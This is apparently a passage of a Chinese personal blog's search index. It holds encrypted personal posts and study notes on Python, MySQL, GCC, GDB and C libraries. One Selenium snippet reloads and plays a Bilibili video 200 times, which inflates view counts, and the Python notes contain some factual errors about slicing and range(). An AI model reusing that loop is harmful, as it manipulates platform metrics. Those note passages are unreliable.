strlen(buf));\t\tprintf(&quot;write[%s] finished!!!\\n&quot;, buf);\t\tclose(client_sock);\t&#125;\treturn 0;&#125;\n\n","categories":["language"],"tags":["c"]},{"title":"2020-02-07 周报","url":"/2020/02/07/life/weekly/2021-02-07-%E5%91%A8%E6%8A%A5/","content":"\n  69d01b89b9601e5c57b37cfc1411681a1f21976d1d4b0aa15d31e1e10e3389772e42aeee5313138167da3c73f7c1895a2954b9550698b917b6892368b24db31bfbfd9c4fb11d218a359f622662c5e3821cf235688142a5c73ecd3ea68defe35f9dc5a807d511643b909fc3c5f644c4b1e5010f234105b87d09b9931e9b0b119ce73da76e9b6fee9b0ede2ef2b1665a4af07da180493994254301ae5e9d19c2ef1ddc2045c5204c8c2a6e3247809952c0eafb9897913787f5e7e571c56daddd1a2a7f328068c50007622d5437a57d82a17519757a4f0ea88692f889b3403e52a393d82910dee69657422454f4043c87437358a7d506090a472dce5ddb30b27cc4b2f552dd6769481ef243e0b3d8596def9e585500a596e2ed9d972a3502aeea1fe38d8a8baf2ee3415cbdc9ed72cf40383d62b70be6c470c04b19ec8e33dd2a7032e40a2d903995c74a3b499645571b1cc16b76beca8801fd41db8fad5752c7e2dcb0beb3136c2113ae7b7a6aae4e770c53f93001425785109cfdc5acfd0f2215e95f08dafede551acd4b1917a00a4315d33eca317e23e368fb89f6e04aa087343232d07eb59ad70cafbe0219968a549d239ca49b628f54f453452c40445adf408fc914281ff8ca39582b5fe5093a9b848f1ec6a9d98b5f08e1d1367716ae365970c53275040d8ea5fa90fa9d029576d6d27f6b1716612862299259c54f41e72ccebcb0daf0805e879076d86ec63f5db06b26aa994e2928ffc396fc0ff852966c\n  \n    \n      \n      \n        请输入与 Rhodes Island™ 取得弱神经连接时的口令：\n      \n    \n  \n\n","categories":["life"],"tags":["life"]},{"title":"忘不掉的故事","url":"/2020/02/03/life/love/memory/","content":"\n  69d01b89b9601e5c57b37cfc1411681a1f21976d1d4b0aa15d31e1e10e338977d5ef56653642e504e9e8840f494d9c2cb51fc6dcc72b91b339d8de48214bd9bae259f37fbc9665e1168e72375e230165345a49589336f133f46a2863ce66aa6e401b4d7ed7698df30ac8e1786a5809b8dcf0b92192532f73c9f7fe1cb1a82576ce6f5ed86b37ad8368ea32d88116210bdf23326d2ac5bc21d5771744c4f78e30bae3e48ae0331f0f1746ed757540db866587ee49f75970fd2d05262b5296fa713c68df8e85fa8f0290c265c4396e98600a5b1cefe318136306fce901ab67ca9f49e6af3e14d0c2ef72225c637dd67c4b7c086094e340e64c33bb86d44b4f293e499d92d10617f46896b732a115f92fb21e4332ac71da31a2ff9c669e8c06464738d9b02d4d2f338a134fa0eed147453f5fa1fbb849067e71f1f4e8c7066d0fd271975b0d9a4d06c5ca1ef75ed3444001f26d403c82a030cba338ba5e9561774ce8ee946b2ba07c31dbbfda081c0dcdee978dec005483b2877b851d0b45cced55d5dea1bd0e3196dd24154c0fa845566e4620010405fb52fa9b1e39079e3a6265507e2c0fe5ad758a6489e37dac22f63e4cb35af9e76fec21815a485bd11a6224ddd68c5997a22b05b828d0a565c58542e36558cd8cc0245d08df9786fcda7b3d1829235a85f8b3e71c043fe8191a32865e5741c1439518e55b09fb9a0171c91cd58471c88ad7cc27c93863d7af5ed9bebec011d640006763dca09f8108a17707fa31ef2df5cdf05228c84f4a7236921f1e7d2fa2bd3ddab0c85c2e00a2f35d4f5dd7eed51afab34d009b4970253844805ccc529de47e1e65351937c21337e88069d9fd2789c1d0b393989a76a861a3da16ce2f6819aef72fc95dae15fdf37b32b5873a3e64b3818b6673da29a65aed0f69275bc0dc1c5ff20e9f0f31839964651d57640b5cf95a33cbe2d74441255a6d48e04f3b8c9d3e4a367c3d3e49abb28143b83cdea9d6d9493cc29447b52ede99ae2a06900cc74a932d23d2045e1083b70fbf63ca250c9498c879ff5cf7e89b94962bb537c214089cdeb13669469402647ddd857d163f89b6021b104229f3f659e4f75c251ad13ee31633fb4d2701a105a5744177d9f61b1aa8b9905db916c4b7d4cf9e53c29ecf4a2873208e3ff5fb0182d5eb1855f3427139440e97f0d34b9d5eebe1f1ce5a7185e7eae39238720d0e4567e83e5d4305bf1d27c9e52d9a779a6e572fd50bf2250fde547c81a54e4df51e673f140d585f1dd007748b9da2cf9dc1f1cc0f404524a0488bdb13f7a27d5c909c226f1ffde8f5c766308bae7f2c95189fc1e694e6283a6e1b3caa6b37b188e48ca93aadf3ff30a1731ea759ffe1509014eaf10df77003f4e935ab6fc83ad6670f562e479b3d2265a793e3dcff1b7bb266eea1dd22867dbb4386d3d0ae31611f300463427e5295dc8211a8b1e41e4723ea67c9b04f79bed130a6b9c2a33be62188bb68e367fbc5bba9bbf6a8c394a1f0c0d8173d78339d6eb20fae0e3c62d540706e60dd3aaab77ea1a55aca65eb5815acaf8de56976158fa7f414aa21ab1424b5826d872ade72ff8be0dbb9ebee584bd9ff759cdaae065593a11fc7731bb16d56f07ede61ba5626e9941dfec30f8bedc9cf4e052d3553feaf4968a523c78d63a26ebe9d4b5c0713a5965d216fc44f276cfe562b69722243d90154fe1497ed8864adfe0cd6c645f4fa18b89afc4088246cdb24128cd2d4540fe698cfb64987a85e177909ed3b58ea611a3b107c1acbb5e8d1a4358460be3bc3fac25db671a8bf329e9e3ebf56556b3eb5edd3a71f65e91f1cf5d999a36f5c76620a793305dbfc9f1b4db31cbcc076e0e42d0f208aca2a7376db8d604c358a0cf452e32a8267d1c63188d78bd952e3e7e5a2fec20f511160b1335acfe36c5cfea8df52ee6ff17c6e18da780194bbd4d6702b0ef840c78623c802cec1bd59e3645a1ac9c11d91eb8b21e8ac8102819dadbea5a0535f7a58a5543419cbb07e46de716796355ec00816b19b310124d89bcd16497060d5741152f2960c86f48479773c87a88da0e9ec8499075e564178d507c65825f52ce3f29f0e2e4ed74bd1e52baa7c165270fa7d50c9c3573ba97b5b7cd811f4483635d5539ce9670922122ef645b388efbc5307a708d4ebbd3ba4b8111c9a26f274b2ea0f8370e55ba9750bbb8c5e1689cbd6939246e78fd3153189eb215391b53557ddc1fd50ee6a57aa118ed29e6427b3aac9b44976e617f5e8b841a9a823052abd7ffa69a77f110f24f0a4d64eeb694396565cac52a248b48714d76bbf1e92587a5cc98d1ca5d0a1904439bf69af3a54ddea8888538a880d9f72ae764db7faee1875af1131e82a728e64cc02321ea1c5f5daf2bac8d122b2007697b61c3fa2dbbaa806c5c7b524a401b95a45c2b4461c6190bf959fb7e6a26015e1d9b66d5ef40df301d0c385fe09bb395c71ff4ef02338369fa1df29df7649c8a406f0ff7ead265b69fe0883a93ce58eae0c79ff207b5d1a757e5613b3dfd3df59c8cc466917e0bb29e998dda2293e8845261604420821c1750463b95d6b6f8fa340882609ace8e2d070a5579c216ad80a50daf45891edec27a9ec83f905786379bd833792ee76b69bdbe9bc61fcd41c86939bc37697be147cdd1ec0837b98a6d046db50c59de3ee26d88a24013b418851fe89f1c97b71f40ed20470c723938c616899425228d8d96ad5133ad4e6e67b9cf098268b339af7fe5ddd8815109a76aa0810c8caf18760da6e108095c852bad87c1ba4ecdbf7348e888030afde2867189f42c121a2859ac6c06ec85a03beb0271d386f2c04e4951494778cee71a6d20b96684f8cfcba6e9ee55d4bf5eda785cd3ceeb84564e911e2b77ec929f37cc5f39ca2f0358eb34bf7767bd40c4dfd7396356c2228212191a6d74f1144ff0f6a889ad1e444947bd28857f3728f67f7acc6b1f2f2c6a6d0d724dbc8b02c3eaed9ac543d985c2a630c8af612dbe09198462dcb8b630930a94170811aab3a2878953c86fb9fa38c23b0cde12b4e5935246b8d4dca9765f9800886a6155456e9530f8cad2cb07fb24865989024e7eda3fb6a18fdb6ef4ac239aebb0ae3fdc8ed9dcd37141a38945c741a43e79b79561dd55b47f08316774ffb9450aee6af13244bd87d3142fa6cebb949908631ab2ebd6ce3926c61e286b4b239dda3fc7fd68fa8a115ea985fff4a6f5ca740c1f165210abf8ce27ea9b116dd4ece3eda63982b1cdcf16d8801d21cb667d7dd43a1cd763a8ef651fa53284b7c5733e05e34dd71821be8e0e42eebc83c1b1cf5202d643f6c6236ad421d7376f7a5feafc3d0c85f47bad0e99662bf3e05fb98face72fe178aa1b16a45a0c44f5020667329d3359399f36a3927403d1eecf15fc3b589b0b2ad44a05f269de534c2a11a0e50c944c495c6921fb3d0921f5fd77f2fd166a439b5a7a04e92990b559e135151b742749bb62497e6549eb1c02adb0c947e9c2aaf4499d122e399861b5e8fb50e97a77d15315710bc389a335b623b35e89a93d577064f5df067e9f0b7bdeafdf4148c5a2449c4da4a991298803292e3ddc23d2cdbfb0c7c8108a5e1b640a594e20c27a76bc5491384bdd1f3c8c6e2f46864ffa4aabaa3235a75bd7b3eb500beffc24746e9ccdc6da71aec51784238429f5f39b58329e54017714c811c979d563eb79c081d923a1bdbcf2dc9554f27988515c8e493205e48cc49f9ea929f8cd9c465db01b023a6b6f9a859d82454d8f11808c45b97e562e9a102bc0607bc4ca85c3bc0cb8417d01c5fe2e7bb25ed014f0035def5a4dd6f3885ca55cb3e5b85175bbbf281d08822e3033b943f93553a5c5cce8df9fbe604af565497db662f6d3d0a494378a3f15226695ee7d9586faf8851654d483a35a7c4b725423189bf3cfb746bd5f80e97fc97fa3c83b1b626d6966fff55687225a70e744e9e5524d598f62f9b69ba1dfa3bd9efb17a9dec98e87205552658c5b117b5707672101a5a87ab69d9f2ac8eda2acd9b2472d315898efc11196638e8eae592e3deb28993a5632a60065ad14d2ed9c6569a7df2a915b866f3ae6a8f5d412c7dd73ea227564e56f41fb11f770efc49bfffd2c4aee6383881606450d6b20043febf86f3f1f9d673e0b15f5fd70908f355ae9b3ac2ecb82cc469ef62f67ba78c45937562ff58e4b4321dada7f5d446232b935ca33f3033587256494f58f4dcb44b5b57bb27999b25df566d76a7c7f80ad91cbaa48c09b7650093dbf66e93a333df6afd05a8f2dd700ce8e02f3521b122b85a2be1c1a4872a6f3cd8dab20f032c811ca3694cb02e346d6dd881939e36c796bab44ff875a65664d1dcd2e5ab0e09475d53a75db9fc72eb84b2d7153b87bf987a65c05abe9149c6f797480660f39cbedea059af800f24b139b9a35a2db515af3d761c9d11ae273ba2928582000b105823095e322abe68192c99a01a3e4724a768ffc6d350f1b180981ba36ac792ea9b41352da195282daf2e682000508c6605e3965f3ea03dd59a5608f31b45b81de629729b6f8874723e7a6a130e022e68eab0b8f7f0c1f7b96faf501d57b7215af43270c9280fc1255db0a809f133639b1680980826b113b6806c4aa274b9463fb65868e8864646dbe3bd95f211989d1a5d5bec9f69e510eb82646a71780ebc741d64c56ce27797a6d121f2f772f74af1e56935fbf7ceda126f1c6940902cf2788045531f102650ff4370c56e46eee9a24fb6e826cc278a553b6c0f8e5f5d8e553f9fc99349d5a9f60b47ce2962569be64ea7a1a07784a79257bb25b710ea30d541c0ecf11a42b552d7ddb47986bc8ab8b245533f474cde628c5f081692efef53a7a2710430331f1ac0049eae3f7b9bd32280cbdc28b028191f45ace5a2a4b5e7f7311b6e88260baadbd86174835116c9fe2e74c57dae2c32121ff99c7f0e0b49f7ff9a679777c2ca8f169aba542d7eb3fc5bfb8167f5954c8bd5a332f083891eb594107717c134839f6bf3ee984bf8c53d76f4b5fd70268f76be8229f72d11c0ed731d5263bdf7cfbaddc3f47ab2d919c9ddd5c72791757096ddcecb81da175a1b457bdb5b649420d0c07d1a309f20402726b0fe3540d642372fb5ab63f466d0ead66d2b59928bdc491f9053bafc7548ac024e9d5fa4e87cdb797cf884f4c7894a47995f99ef7e8b333be494d71e555786b8974b01d5157c8589b3dddb645ae3fd0f0e8f0168ee2155cbbd9f5359b45583ab82d89500b59ed1a66ddc385a481e55c62d5570eee962880414862e5a29b203bac735c07587a4ecf4c4cd03651585392cc96aac54abd8b8ed2b5037b3fbbeec20a95a60d1de2bbc67fd27496bc6aef26105a140f49b6a0e3f402198556d44935fe2484ac83f5787c939af9f7a9dd3b64f900586cf0a5463e9af0db3ebbf5bcac2d1d9c5e7bd\n  \n    \n      \n      \n        请输入与 Rhodes Island™ 取得弱神经连接时的口令：\n      \n    \n  \n\n","tags":["life"]},{"title":"2020-02-01 周报","url":"/2020/02/01/life/weekly/2021-02-01-%E5%91%A8%E6%8A%A5/","content":"\n  69d01b89b9601e5c57b37cfc1411681a1f21976d1d4b0aa15d31e1e10e33897784f5d3fc8bfefc5b6a3516ccbf3af114f5273944a9df5f3a0edb42d452bff8057aff37bd40a02091f6e6299bb705e2a668e3578c6474d1a61dc163c0571589b157ed9ea3c4e22fff54539d454573d4c88448027b2cf2fe2fec05b5b8c5e671414ccecbbe7dce61dc3f9082b5c241b31670018456677593c816ca2e4fb35862d130d254b3b30294f562274d7d3023e3ccbdeeab71ad1dfde19672ad5cf9b0f6f131740cffbaa8de1d7f071e4f09bb86f979eaae500235e8bcfcd8747da11f868054ae7a816afeea199cabb9bdbcb7acdd6c88bb52d43043252c4a8c2f2e351044f9a3b172ccd11ab70b367efd90ec2fb728ef3683d44811bd7e409bad68755585925a881695f33f8d99c823211c13dbb9644896f005a0bb35ebf8cc432c80d9c6bc01a9b83368d5ad9889e546e0d9c49b8c4603cc19e14983cbb40afe7ba451dcb554e5423de6633a3b63fdcc3e420db18db4f70ada18deb8865f37dde2f14c08896d7e25593ea10b219c758b30afad5a658e768a1d500cfd225210655565ba693e55917f2d5e19ec34281ada10bed701a4e47ffcbf8a38512a401de783190f9f894cc2f27fe31ebc05532b2177ac4e89624b83fe93b50d9bcae170f2f5596e14b0636b278c71981224df0ceb0c7a995fd8c08cab36f303888929474a83bb3836f360beb358c90d65478b280851d8b35aec6a159ff1d153102bcbc724b0c3e2d5ae6f9b07857c03dc7ff207304e71ba9cd95a56df7d563e0e5446b6239a81283748dd5ccee194fb9e28db6dc9f85d944845f26e99de1dafb8a7f1da9606c6b45eb62b685f0c3fce1ed57b1c14648a1928edc119580ce23716eaaff8e1295dbf20df8d4c6a4f6f1dacd81c2de48adff8b0245a73a038f60e3ac6390af6964cf664270b64fc215505b3e7d66e41e206d162fb55f5aebcf6c21cd8c275923ee99746e90a5e0457987c088a73fe63cb31df28c1e74691385677a99118bc3e1b58f51770d5dd7484d228a3ab8cea475dfe57203dc188920cbacad2ea6842fd92db31911409fe7700d256768071b6a2c5d3b3654ea403254e5b941908878111fd30879d4630ce88b1bc990ceb2a6da039af48bbe9493030ccf6bd58a7a5206979ba11b31c352d311740b0efa6fc8f9a9a5baa43cd1a8af6d9f5db0813f418ac687fe719e65d3391e037b2013146db99c86cf60451ba1fda650a28533f1ccf60bd3cfe761015363d9effa9d00f1165c5420d767da2435a850d48e630555cc72da7c8f8f9\n  \n    \n      \n      \n        请输入与 Rhodes Island™ 取得弱神经连接时的口令：\n      \n    \n  \n\n","categories":["life"],"tags":["life"]},{"title":"2020-01-24 周报","url":"/2020/01/24/life/weekly/2021-01-24-%E5%91%A8%E6%8A%A5/","content":"\n  69d01b89b9601e5c57b37cfc1411681a03e0fcf85ae9afb41f9bc2de2a059e9b1e701c98a3a4aead809c3927a2d7b821589b609e6f24da209605978072317437d548e9c0c781be6d9579d045f154c648a4f7d639b5e76c08db7e9c1f144c55b6331df450d3620ba268d2036a4537d404e8962fd8ce966a5b70bbd74963f7f1af2f7168ebd775708661ced5343d12f672106f8a4921ea13fca51d2e41bc50b6e7d84c5b2951b242c754df6fd446aa0aca4cfc8ef30f1ca9a4d95a2eb15a1be238cee90c80ca8c3f667cc07a14a471927c0ce28ff13c7f242c87aef56e475d57c6f4400c7ea01281edd38023684b89d4d15ac757018d6297faa5f7719c0174f5189307198992daf54d1b6a9c35221a40835ab30bfd0cf2f61690aab3623a35cf8011f54d1f1f1ea5813a384a15bf86d9faf29b442ec004d4e2cb56d51f6f3c58277669b83cb6f80f37efd1e8200b43d3a99bc0c52a6f6f2cbb789a1b9e41ce98b1362e3592bcd27a31528ab5d0b7e192b7ddd67f31755262c63cfe7ee4a7f664e921fe7260662669037c1be63dce0929097c9a5c1eed018865f52c260bdc220c9619150580c6c27c9233208881f6a6448e9204871e5ff4abe952f19b010f69bee173b6cb38ca38d00f602cbc5a493a76c7a859997f276fc35ef6f8e08ab46798995d88ca2977d3a98cbc5c34b2621cdc501e31dc7f5c3487e38b636fad445c5a3f012c259df7eeb50872fb866ae360ff22d2fd35068ec39f83405489c5749f446f290742bd8434da14036f988cb09bd8f5b8a682d8b99a05166d816d215173d6ce0ea4483f042bbce27f51283c5b063d054f5667ce6d51cecca9a2197fc2f274a8edf94ba907610cce75542a5899e7dd5e318b554445ce1bf2fe5283215b02ac2912b4fac5f85880eba9dcdaa3d7c84bb27fa51dc36889825eab85328e96d096a38c42ec38255827bd2d5beb960e0b446ff5e15d0771e6e7cff094c7fd4e11e5cc763aab69f68b4f28b402a9a0afcbb6898aa2169d4a6e8366c0cdcd94333900efc47bca7056229effba0e0dd183771aa0c638cc41e8d955bac2d3e35b8ae806612880cb49fc5882e8f55b888b7eaa42893638de8bc0e05b6b4a2da659c9cd20defb5e0b72fa1aee78063fd9597fa9ce0f8fea3b3bb1f1a23439f2cc1a191764feb6db2ead422e0365a3050edcd3c4fe53de77b80cda5af064c43b861b5b430a283903d9f8a679e853418522454ee6924cea19fe93b1d8639b8f06cd1a1fc80655b00c152fd4128f9f228613c18eb07d1899b202408eeadc78f7ce649c2949f98924b00c6734d8a38590c1260d79b5724fa0186d1a6214bb47155bbf04288dc4bf\n  \n    \n      \n      \n        请输入与 Rhodes Island™ 取得弱神经连接时的口令：\n      \n    \n  \n\n","categories":["life"],"tags":["life"]},{"title":"Python基础","url":"/2019/12/18/dev/language/python/python/","content":"Python 基础Basic变量类型1 Number   整数,浮点数,复数，布尔2 String   ‘Hello’,”str”3 List    [‘a’,’b’,’c’],[1,2,’op’],[]4 Tuple    (1,2,3),(‘a’,’b’),5 Dictionary    {‘apple’:2,’grape’:6,’cherry’:10}\nNumber的使用\nnum1&#x3D;2     –以十进制方式赋值num2&#x3D;0b1000   —-二num3&#x3D;0o24   —-八num4&#x3D;0x3F   —-十六\nboolb_var1&#x3D;Trueb_var2&#x3D;Flase\n复数 Complexc_num&#x3D;complex(2,4) —–(2+4j)\n查看数据类型函数type()\n运算符 &#x3D;  ca等效于 c&#x3D;**a 幂赋值运算符 &#x2F;&#x2F;&#x3D;  c&#x2F;&#x2F;a等效于 c&#x3D;&#x2F;&#x2F;a 取整赋值运算符 ~ 取反 逻辑运算符 and &#x2F; or &#x2F; not 成员运算符 in not in\n字符串类型 可以使用” ‘ ‘’’ 互相穿插使用可以实现转义   例:   str1&#x3D;’abc’   str1[0] 表示’a’   str1[1] ….’b’   str1[-1]….’c’   str1[-2]….’b’   str1[-3]….’a’   str1[0:2]….’abc’对字符串进行修改:   不能直接赋值,需转化为字符串   str&#x3D;’abc’   list1&#x3D;list(str)   list1[0]&#x3D;’A’   str&#x3D;’’.join(list1)   这就实现了对a的替换\nList 列表   l_1&#x3D;[‘abc’,”AA”,2.34,1,43]  里面可以是任意的数据类型   创建空列表   l_2&#x3D;[]\n   访问列表,如同数组   l_2[-1]….1.43   1_2[0:3]…ALL-———————————————–\nTupleTuple特殊的 List\n   不能修改,以”()”将元素阔起来,各个元素用’,’隔开   当Tuple只有一个时,需要在元素后面添加都逗号,不然会变为其他类型\n   del 删除   len()   元素个数   max()   元素Max   min()   元素Min\nDictionary   创建Dict   dict1&#x3D;{key:value1,key2:value2….}   key唯一   value任意类型   添加键值对:   dict1[‘abc’]&#x3D;2 —value&#x3D;2 ,key&#x3D;’abc’\n   del dict[‘abc’]   len()   str()\n输入和输出   input([prompt]) 接受一个stdin ,retun str   prompt提示信息\n   print(value,…,sep&#x3D;”,end&#x3D;’\\n’)   value:用户要输出的信息   sep:多个要输出的信息之间的分隔符   end:一个print()函数里所输出信息之后添加的符号,默认是换行符\nif语句   if condition:     statement1     statement2   else:     statement3     statement4\nfor语句   for num in range(0,10):     statement\n   range()函数返回值就是一个list\n例子if else\n#!/bin/pythona=1if a==1:    print a    print a+1else:    print 2\n\nrequests库\n#!/usr/bin/pythonimport osimport requestsurl = &#x27;https://www.baidu.com&#x27;#os.environ[&#x27;NO_PROXY&#x27;] = &#x27;https://172.28.92.106&#x27;response = requests.get(url, verify = False)print(response.text)\n\nselenium库\nfrom selenium import webdriver# 实现打开网站# 打开浏览器驱动wd = webdriver.Chrome(&#x27;/usr/bin/chromedriver&#x27;)# get方法请求 urlwd.get(&#x27;https://www.bilibili.com&#x27;)print(&quot;ok&quot;)\n\nselenium实现自动百度搜索\nfrom selenium import webdriver# 根据id 来实现获取元素# 实现自动百度搜索# WebDriver 对象wd = webdriver.Chrome(&#x27;/usr/bin/chromedriver&#x27;)wd.get(&#x27;https://www.baidu.com&#x27;)# 输入框info = wd.find_element_by_id(&#x27;kw&#x27;)# 搜索按钮btn = wd.find_element_by_id(&#x27;su&#x27;)# 输入内容info.send_keys(&#x27;hello world&#x27;)# 点击按钮#btn.click()\n\nselenium实现循环加载页面\nfrom selenium import webdriverimport timewd = webdriver.Chrome(&#x27;/usr/bin/chromedriver&#x27;)for i in range(200):    try:        wd.get(&#x27;https://www.bilibili.com/video/BV19z4y197zC?&#x27;)        video = wd.find_element_by_class_name(&#x27;bilibili-player-video&#x27;)        video.click()        time.sleep(15)        wd.close()        wd = webdriver.Chrome(&#x27;/usr/bin/chromedriver&#x27;)    except:        continue\n\n线程\n#! /usr/bin/python3import _threadimport time# 为线程定义一个函数def print_time(thread_name, delay):    count = 0    while count &lt; 5:        time.sleep(delay)        count += 1        print(&quot;%s : %s&quot; % (thread_name, time.ctime(time.time())))try:    _thread.start_new_thread(print_time, (&quot;thread - 1&quot;, 2))    _thread.start_new_thread(print_time, (&quot;thread-2&quot;, 4))except:    print(&quot;启动线程失败&quot;)while 1:    pass\n\n","categories":["language"],"tags":["python"]},{"title":"Mysql","url":"/2019/12/18/dev/db/mysql/mysql/","content":"Mysql创建数据库语法:\n基本语法:   create database 数据库名称;正宗语法:   create database 数据库名称 character set ‘编码’ collate ‘校对规则’;\ncrate database hello character set ‘utf8’;\n查看数据库:\nshow databases; –查看所有数据库use [D_name];(*****) –使用数据库show create database [D_name]; –查询数据库创建的信息select database(); –查询当前正在使用的数据库\n删除数据库:\n   \\1. drop database [D_name]; –删除数据库\n修改数据库:\n   \\1. alter database [D_name] character set ‘gbk’ collate ‘校对规则’\n创建表:\n   1.create table [T_name](   字段1 类型(长度) 约束,   字段2 类型(长度) 约束,   …  ..  ..   ..); —最后一个字段不能有逗号\n注意:   *如果不指定数据的长度,有默认值.int 类型默认长度是11   *如果声明字符串类型,长度是必须指定的.\n例:\nmysql - u root -p rootshow databases;use xxx;create table emp(   id int,   name yarchar(30),   gender char(5),   birthday date,   entry_data date,   job varchar(50),   sal double,   resume text);\n\n数据库的数据类型   VARCHAR (用的比较多) :长度可变例: name varchr(8),存入数据hello,存入后,name字段长度自动变成了5.\n   CHAR : 长度不可变例: name char(8) 存入数据hello,用空格来不全剩余的位置.\n大叔据类型:(不常用)   BLOB :字节(电影 mp3)   TEXT :字符(文本内容)数值型:   TINYINT,SMALLINT,INT,BIGINT,FLOAT,DOUBLE逻辑型:   BIT   在Java中是true或者flase   在数据库bit类型(0或1)日期类型(重点)   DATE :只包含日期(年月日)   TIME :只包含时间(时分秒)   DATETIME :包含日期和时间.如果插入数据的时候,字符值为空,字段的值就是空了.   TIMESTAMP :包含日期和时间.如果插入数据的时候,设置字段的值为空,默认获取当   前的系统的时候,把时间保存到字段中\n单表约束   1.好处:保证数据的完整性   2.主键约束:(重要) 代表记录的唯一标识    *关键字:primary key 通过关键字声明某一列为主键    *唯一   值不能相同    *非空   值不能为空    *被引用  和外键一起来被引用   3.唯一约束     声明字段值是唯一的,使用关键字 unique   4.非空约束:     声明字段的值是不能为空.not null\n删除和查看表1.删除表: drop talbe [T_name];2.查看标签   * desc [T_name]; –查询表的信息   * show tables;  –查看当前数据库中所有的标签   * show create table [T_name]; –查看表创建的信息修改表:   * alter table [T_name] add [新列名] [类型(长度)] [约束]; –添加列   * alter table [T_name] drop [列名]; –删除列   * alter table [T_name] modify [列名] [类型(长度)] [约束]; –修改列的类型或者约束   * alter table [T_name] change [旧列名] [新列名] [类型(长度)] [约束]; –修改列名   * rename table [T_name] to [New_T_name];  –修改表的名称   * alter table [T_name] character set utf8; –修改表的字符集-——————————————————————–\n数据库的数据(CURD)插入数据(insert):   1.添加数据,使用insert关键字    * insert into 表 (字段1,字段2,字段3) values(值1,值2,值3);    * insert into 表 values(值1,值2,值3,值4…);\n   2.注意实现:    * 插入的数据与字符数据的类型相同    * 数据的大小应该在规定的范围内    * 数据中的数据的列的位置和字段位置是相同的    * 字符串和日期类型的数据,必须要使用单引号括起来\n   3.向员工表中添加数据:    insert into workers (name,age) values (‘Lihua’,26);    insert into workers values (‘LiHua’,26);\n插入中文数据乱码问题:   修改mysql客户端的编码既可,改为GBK\n","categories":["dev"],"tags":["mysql"]},{"title":"GCC-GDB-Makefile学习笔记","url":"/2019/11/28/env/gcc/","content":"GCC编译过程a.c -&gt;预处理-&gt; a.i -&gt;汇编-&gt; a.s -&gt;编译-&gt; a.o -&gt;链接-&gt; a.outgcc -E -o a.i a.c (预处理)gcc -S -o a.s a.i (编译)gcc -c -o a.o a.s (汇编)gcc -o a.out a.o  (链接)\n后辍文件详解:&lt; .c &gt; C语言源码文件&lt; .a &gt; 目标文件构成的库文件&lt; .C &#x2F; .cc &#x2F;.cxx &gt; C++ 源码文件&lt; .h &gt; 头文件&lt; .o &gt; 编译后的目标文件&lt; .s &gt; 是汇编语言源代码文件\n编译选项:&lt; -o file_name &gt;  指定输出文件&lt; -O &gt;  对程序进行优化编译,链接&lt; -O2 &gt; 对程序进行更好的优化编译,链接&lt; -O3 &gt; 最佳优化&lt; -g &gt;  对程序加入调试 (gdb 调试)&lt; -I dir_name &gt;  将所指出的目录作为编译器寻找头文件的路径&lt; -Wall &gt; 生成所有警告信息&lt; -w &gt;    不生成任何警告信息\n&lt;  -D&#x2F;-DMACRO &gt; 定义MACRO宏，等效于在程序中使用#define MACRO\n(应用场景:可以控制debug的输出)\n    GDB\n\nlayout asm —汇编界面b *addr        查看内存命可以使用examine命令(简写是x)来查看内存地址中的值。x命令的语法如下所示：x&#x2F;&lt;n&#x2F;f&#x2F;u&gt; n、f、u是可选的参数。n是一个正整数，表示需要显示的内存单元的个数，也就是说从当前地址向后显示几个内存单元的内容，一个内存单元的大小由后面的u定义。f 表示显示的格式，参见下面。如果地址所指的是字符串，那么格式可以是s，如果地十是指令地址，那么格式可以是i。u 表示从当前地址往后请求的字节数，如果不指定的话，GDB默认是4个bytes。u参数可以用下面的字符来代替，b表示单字节，h表示双字节，w表示四字 节，g表示八字节。当我们指定了字节长度后，GDB会从指内存定的内存地址开始，读写指定字节，并把其当作一个值取出来。表示一个内存地址。注意：严格区分n和u的关系，n表示单元个数，u表示每个单元的大小。n&#x2F;f&#x2F;u三个参数可以一起使用。例如：命令：x&#x2F;3uh 0x54320 表示，从内存地址0x54320读取内容，h表示以双字节为一个单位，3表示输出三个单位，u表示按十六进制显示。输出格式一般来说，GDB会根据变量的类型输出变量的值。但你也可以自定义GDB的输出的格式。例如，你想输出一个整数的十六进制，或是二进制来查看这个整型变量的中的位的情况。要做到这样，你可以使用GDB的数据显示格式：\nx 按十六进制格式显示变量。d 按十进制格式显示变量。u 按十六进制格式显示无符号整型。o 按八进制格式显示变量。t 按二进制格式显示变量。a 按十六进制格式显示变量。c 按字符格式显示变量。\nf 按浮点数格式显示变量。\n静态库  1.命名规则:    lib+库名+.a  2.制作静态库:     生成对应的.o文件  .c—&gt; .o     (gcc -c a.c b.c c.c ….)      将生成的.a文件打包 ar rcs 生成静态库名 lib1.o lib2.o ….. (ar src liblogan.a .&#x2F;*.o)  3.发布和使用静态库:    1发布静态库: 把头文件移动到include里,把.a文件移动到lib里    2头文件  4.使用接口:    1源文件里导入头文件,gcc main.c -I .&#x2F;include lib&#x2F;lib.a (后面导入lib文件)  (把main.c 放第一位)      2正式用法: gcc main.c -Iinclude -L lib -l logan -o run  (logan 去头去尾: liblogan.a)    -I 指定头文件路径\t(可以无空格)    -L 指定lib目录    -l 指定lib目录下的lib文件  5.查看静态库文件:    nm lib.a  (nm 还可以查看.out .o)    nm 里    T 代表代码区    B b D W t r  6.缺点:    1若使用静态库里的某一个函数,则编译时会将整个.o文件连接到可执行文件中,占用空间(以.o文件为单位)    2库文件发生改变,需重新编译  7.优点:    1发布程序的时候，不需要提供对应的库\n​\t2Load程序的时候，速度快\n共享库  1.命名规则:    lib+库名+.so  2.制作共享库:    1生成与位置无关的.o  (gcc -fPIC -c .c)    2将.o打包成共享库(动态库) (gcc -shared -o liblogan.so .&#x2F;.o)  3.发布和使用共享库:    1发布共享库: 把.so文件移动到lib里    2使用共享库:       在编译目标代码时只需导入动态链接库就可以使用(单个)       一*  gcc main.c  lib&#x2F;libprint.so -o run\n使用:(gcc main.c -L lib -l print -o run)会导致在运行时无法链接需使用以下方法进行链接\n1*使用环境变量来导入lib.so\necho $LD_LIBRARY_PATH\nexport LD_LIBRARY_PATH=./lib (临时测试用)\n\n2*修改配置文件来实现永久修改:(永久)(不常用)\nvim ~/.bashrc\n找到 LD_LIBRARY_PATH=...然后进行修改\n\n3*修改动态链接器的配置文件实现链接lib(永久)\n     1-&gt;找到动态链接器的配置文件\n    sudo vim /etc/ld.so.conf\n     2-&gt;动态路径些到ld.so.conf里\n     3-&gt;更新  sudo ldconfig -v\n3查看可执行程序的链接库: ldd file  (print share object dependencis)\n4动态库的优缺点:\n    优点:\n    体积小\n    更新不需重新编译程序,实现了模块化(函数接口不变的情况下)\n    缺点:\n    需要把动态库提供给用户\n    加载速度相对较慢\n\n\ngdb调试命令:\nl ----list 查看源码\n  l 10 查看10行\n 